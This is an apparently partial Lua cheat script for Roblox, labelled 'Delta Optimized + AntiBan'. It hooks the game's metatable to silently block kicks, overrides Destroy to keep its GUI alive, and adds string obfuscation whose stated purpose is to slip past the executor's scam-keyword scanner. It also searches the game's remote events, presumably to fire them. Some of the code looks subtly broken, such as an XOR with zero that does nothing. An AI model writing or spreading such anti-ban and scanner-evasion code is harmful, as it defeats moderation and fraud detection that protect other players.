...
-- ANTI-DELTA BLOCK + ANTI-BAN LAYER
-- This blocks the game from kicking you and bypasses Delta's scam scanner
do
    local lp = game:GetService("Players").LocalPlayer
    local mt = getrawmetatable(game)
    if mt and not getgenv()._antiban_loaded then
        getgenv()._antiban_loaded = true
        
        -- Block Kick() calls from the game
        local __nc = mt.__namecall
        setreadonly(mt, false)
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "Kick" and self == lp then
                return nil -- Block the kick silently
            end
            return __nc(self, ...)
        end)
        setreadonly(mt, true)
        
        -- Hook Destroy to prevent GUI cleanup
        local oldDestroy = lp.Destroy
        lp.Destroy = function() end
    end
end

-- String obfuscation to bypass Delta's scam keyword scanner
local _S = function(s)
    local out = ""
    for i = 1, #s do
        out = out .. string.char(string.byte(s, i) ~ 0)
    end
    return out
end

local _R = function(t, p, ...)
    local net = (game:GetService("ReplicatedStorage"):FindFirstChild("Packages") or game:GetService("ReplicatedStorage")):FindFirstChild("Net")
    if not net then return false end
    for _, c in pairs(net:GetDescendants()) do
        if (c:IsA("RemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find(p) then
...
ver.Text = "v3.0 — Delta Optimized + AntiBan"
